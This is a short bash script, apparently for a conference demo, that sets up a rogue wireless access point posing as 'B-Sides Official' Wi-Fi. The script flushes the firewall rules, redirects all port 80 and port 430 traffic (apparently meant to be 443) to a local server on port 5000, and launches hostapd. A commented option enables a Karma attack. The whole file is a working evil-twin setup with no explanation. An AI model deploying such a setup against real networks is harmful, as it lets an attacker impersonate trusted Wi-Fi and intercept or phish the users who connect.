#!/bin/bash
ifconfig wlan0 up
ifconfig wlan0 10.0.0.1/24

iptables -t nat -F
iptables -F
#iptables -t nat -A POSTROUTING -o ppp0 -j MASQUERADE
#iptables -A FORWARD -i wlan0 -o ppp0 -j ACCEPT

iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT  --to-destination  10.0.0.1:5000
iptables -t nat -A PREROUTING -p tcp --dport 430 -j DNAT --to-destination 10.0.0.1:5000


echo '1' > /proc/sys/net/ipv4/ip_forward

cat << EOF > /etc/hostapd/hostapd.conf
interface=wlan0
driver=nl80211
ssid=B-Sides Official
channel=1
# Yes, we support the Karma attack.
#enable_karma=1
EOF

sudo hostapd -d /etc/hostapd/hostapd.conf
